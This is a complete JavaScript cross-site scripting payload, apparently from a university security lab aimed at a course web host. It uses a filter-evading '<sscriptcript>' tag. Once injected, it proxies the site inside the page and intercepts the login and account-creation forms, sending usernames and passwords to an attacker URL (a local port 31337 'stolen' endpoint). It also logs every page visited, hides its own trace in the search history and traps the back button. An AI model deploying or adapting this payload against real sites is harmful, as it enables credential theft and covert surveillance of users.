<sscriptcript>
	var payload = function(attackerUrl){
	var baseUrl = "http://trurl.cs.illinois.edu";
	var getUsername = function(){
		var nameSpan = document.getElementById("logged-in-user");
		if(nameSpan == null){
			return null;
		}
		return nameSpan.innerHTML;
	};
	var getEncodedUrl = function(){
		return encodeURI(document.location.href);
	};
	var changeAddr = function(url){
		window.history.replaceState({}, "", url);
	};
	var logPage = function(){
		var username = getUsername();
		var p = {};
		p["event"] = "nav";
		p["url"] = getEncodedUrl();		
		if(username != null){
			p["user"] = username;
		}	
		$.get(attackerUrl, p);
	};


	var logLogin = function(){
		var user = document.getElementById("username").value;
		var pass = document.getElementById("userpass").value;
		var p = {"user":user, "pass":pass, "event":"login"};
		$.get(attackerUrl, p);
	}
	var login = function(){
		logLogin();
		var user = document.getElementById("username").value;
		var pass = document.getElementById("userpass").value;
		$.post(baseUrl + "/login", {"username":user, "password":pass}, function(){
			proxy(baseUrl);
		});
	}
	var create = function(){
		logLogin();
		var user = document.getElementById("username").value;
		var pass = document.getElementById("userpass").value;
		$.post(baseUrl + "/create", {"username":user, "password":pass}, function(){
			proxy(baseUrl);
		});
	}
	var logLogout = function(){
		var user = getUsername();
		var p = {"user":user, "event":"logout"};
		$.get(attackerUrl, p);
	};
	var logout = function(){
		logLogout();
		var user = getUsername();
		var p = {"user":user, "event":"logout"};
		$.post(baseUrl + "/logout", {}, function(){
			proxy(baseUrl);
		});
	}
	var loadInit = function(){
		proxy(baseUrl);					
	}
	
	var listeners = function(){
		var loginButton = document.getElementById("log-in-btn");
		var createButton = document.getElementById("new-account-btn");
		var logoutButton = document.getElementById("log-out-btn");
		var searchButton = document.getElementById("search-btn");
		var searchAgainButton = document.getElementById("search-again-btn");
		if(loginButton != null){
			$("#log-in-btn").click(function(e){
				e.preventDefault();
				login();
			});
			$("#new-account-btn").click(function(e){
				e.preventDefault();
				create();
			});
		}
		if(logoutButton != null){
			$("#log-out-btn").click(function(e){
				e.preventDefault();
				logout();
			});
		}
		if(searchButton != null){
			$("#search-btn").click(function(e){
				e.preventDefault();
				var query = $("#query").val();
				proxy(baseUrl + "/search?q=" + query);
			});
		}
		if(searchAgainButton != null){
			$(".history-item").click(function(e){
				e.preventDefault();
				var query = e.target.href;
				proxy(query);
			});
			$("#search-again-btn").click(function(e){
				e.preventDefault();
				proxy(baseUrl);
			});
			var historyList = document.getElementsByClassName("history-item");
			for(var i in historyList){
				if(historyList[i].innerHTML.indexOf("var payload") >= 0){
					historyList[i].style.display = "none";
				}
			}
		}
	}
	function proxy(href) {
		$("html").load(href, function(){
			$("html").show();
			changeAddr(href);
			logPage();
			listeners();
		});
	}
	loadInit();
	//state change help from: https://stackoverflow.com/questions/5121666/when-the-back-button-triggers-popstate-how-can-i-prevent-a-page-refresh
	var foo = {foo: true}; 
	history.pushState(foo, "", "");
	var bar = {bar: true}
	history.pushState(bar, "", "");
	window.onpopstate = function(event){
		proxy(document.location.href);
		var baz = {baz: true}
		history.pushState(baz, "", "");
	};
	};
	payload("http://127.0.0.1:31337/stolen");
</sscriptcript>
